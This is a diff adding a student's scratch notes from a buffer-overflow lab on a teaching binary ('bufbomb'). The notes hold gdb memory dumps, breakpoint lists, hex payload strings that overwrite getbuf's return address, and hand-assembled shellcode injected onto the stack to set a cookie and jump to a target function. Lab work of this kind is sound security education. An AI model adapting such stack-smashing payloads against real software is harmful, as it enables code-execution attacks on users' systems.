@@ -1,0 +1,90 @@
+x /xg 0x7fffffffbac8 return addr gets
+x /xg 0x7fffffffbb08 return addr getbuf +64
+ 
+
+after
+
+x /xg 0x7fffffffbad0 buf
+
+
+old rbp
+(gdb) x /xg 0x7fffffffbb00
+0x7fffffffbb00:	0x00007fffffffbb30
+
+
+00000000004010c0 00000000004010c0 00000000004010c0 00000000004010c0 00000000004010c0 00000000004010c0 00007fffffffbb30 00000000004010c0 
+
+0000000000401070
+
+cf
+a4
+30
+32
+5c
+52
+30
+7b
+Cookie: 0x7b30525c3230a4cf
+
+
+c010400000000000 c010400000000000 c010400000000000 c010400000000000 c010400000000000 c010400000000000 30bbffffff7f0000 7010400000000000 7b30525c3230a4cf
+
+mov $0x7b30525c3230a4cf 602308
+push $0000000000401020
+retq
+
+
+48b8cfa430325c52307b  48890425c4300900  ff342520104000  c3  30303030303030303030303030303030303030303030 30bbffffff7f0000 d0baffffff7f0000
+
+50 53 48b8cfa430325c52307b 48 c7 c3 08 23 60 00 48 89 03 5b 58 68 20 10 40 00 c3 303030303030303030303030303030303030 30bbffffff7f0000 d0baffffff7f0000
+
+
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep n   0x0000000000400da0 in getbuf at bufbomb.c:132
+3       breakpoint     keep n   0x0000000000400cb0 in Gets at bufbomb.c:203
+4       breakpoint     keep n   0x00000000004010c0 in smoke at bufbomb.c:63
+6       breakpoint     keep n   0x0000000000400db1 in getbuf at bufbomb.c:137
+7       breakpoint     keep n   0x0000000000400d74 in Gets at bufbomb.c:240
+8       breakpoint     keep n   0x0000000000400ef3 in test at bufbomb.c:109
+9       breakpoint     keep n   0x00007fffffffbad0 
+
+run -u 3511611 < bang.bytes
+
+(gdb) x /8xg 0x00007fffffffbad0
+0x7fffffffbad0:	0x525c3230a4cfb848	0x30c4250489487b30
+0x7fffffffbae0:	0x4010202534ff0009	0x303030303030c300
+0x7fffffffbaf0:	0x3030303030303030	0x3030303030303030
+0x7fffffffbb00:	0x00007fffffffbb30	0x00007fffffffbad0
+
+0x7fffffffbad0:	0x525c3230a4cfb800	0x30c4250489487b30
+0x7fffffffbae0:	0x4010202534ff0009	0x303030303030c300
+0x7fffffffbaf0:	0x3030303030303030	0x3030303030303030
+0x7fffffffbb00:	0x00007fffffffbb30	0x00007fffffffbad0
+
+
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep y   0x0000000000400d74 in Gets at bufbomb.c:240
+	breakpoint already hit 1 time
+2       breakpoint     keep y   0x00007fffffffbada 
+3       breakpoint     keep y   0x00007fffffffbaef
+
+break getbuf
+break *0x7fffffffbad0
+info break
+delete 2
+nexti 3
+step
+c(continue)
+disas
+
+info register rsi
+x /xg 0x00007fffffffbad0
+x /xg $rsi
+x /8xg 0x00007fffffffbad0
+
+exploit.s　bang 注入到栈的代码
+
+
+
+
+
